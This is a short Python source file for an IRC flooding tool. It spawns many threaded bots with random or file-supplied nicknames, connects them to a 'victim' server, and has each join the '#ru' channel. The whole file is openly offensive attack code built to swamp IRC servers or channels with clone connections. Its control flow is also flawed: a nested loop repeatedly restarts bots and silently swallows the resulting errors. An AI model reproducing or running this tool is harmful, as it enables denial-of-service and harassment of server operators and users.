from .overlay import IRCOverlay
import configparser, sys, threading, random, string,time
class BotAttack(threading.Thread):
 irc=IRCOverlay(None,None,None,None)
 victim=""
 nick=""
 username=""
 realname=""
 dest=""
 def __init__(self,serv,victim,nick,username,realname):
  self.victim=victim
  self.nick=nick
  self.username=username
  self.realname=realname
  self.dest=serv
  super(BotAttack, self).__init__()
 
 def run(self):
  self.irc=IRCOverlay(self.dest,
  self.nick,
  self.username,
  self.realname)
  print("Bot %s inited" % (self.nick) )
  self.irc.cjoin("#ru")  
  self.irc.hand.commands()
  pass

class attack():
 victim=""
 botsM=0
 bots=[]

 def __init__(self, serv,victim, count=10, nicks_from_file=False,nicklength=8,pause_bot=30):
  self.victim=victim
  nicks=[]
  if nicks_from_file:
     with open('Nicks','r') as nicksf:
      nicks=nicksf.read().split('\n')
  else:
     for bot in range(1,count):
      nicks.append(''.join(random.choice(string.ascii_lowercase) for i in range(nicklength)))
  for nick in nicks:
       self.bots.append( BotAttack(serv, victim, nick, nick, nick)  )
       for bot in self.bots:
        try:
         print("Start bot...")
         bot.start()
         time.sleep(pause_bot)
        except RuntimeError:
         pass
